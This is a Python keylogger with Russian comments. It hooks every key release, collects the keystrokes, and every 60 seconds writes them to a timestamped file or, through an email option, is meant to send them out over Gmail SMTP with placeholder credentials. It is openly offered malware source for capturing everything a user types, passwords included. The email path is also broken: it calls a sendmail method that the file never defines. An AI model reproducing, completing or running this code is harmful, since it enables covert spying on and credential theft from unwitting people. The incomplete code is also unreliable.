import keyboard
import smtplib  # для отправки электронной почты по протоколу SMTP (gmail)
from threading import Timer
from datetime import datetime

# Замените на свои учетные данные
EMAIL_ADDRESS = "your_email@gmail.com"  # Замените на свой email
EMAIL_PASSWORD = "your_password"  # Замените на свой пароль или App Password
SEND_REPORT_EVERY = 60  # Отправлять отчет каждые 60 секунд


class Keylogger:
    def __init__(self, interval, report_method="email"):
        # передаем SEND_REPORT_EVERY в интервал
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        # запись начала и окончания даты и времени
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            # не символ, специальная клавиша (например, ctrl, alt и т. д.)
            # верхний регистр
            if name == "space":
                # " " вместо пробелов
                name = " "
            elif name == "enter":
                # добавлять новую строку всякий раз, когда нажимается ENTER
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # замените пробелы символами подчеркивания
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # добавить имя ключа в глобальную переменную
        self.log += name

    def update_filename(self):
        # создать имя файла, которое будет идентифицировано по дате начала и окончания записи
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        # создать файл
        with open(f"{self.filename}.txt", "w") as f:
            # записать лог
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            # обновить `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        # старт
        timer.start()

    def start(self):
        # записать дату и время начала
        self.start_dt = datetime.now()
        # запустить кейлогер
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


if __name__ == "__main__":
    # для отправки по email раскомментировать строку ниже и закомментировать строку с report_method="file"
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # для записи в локальный файл оставляем как есть
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")  # Или "email"
    keylogger.start()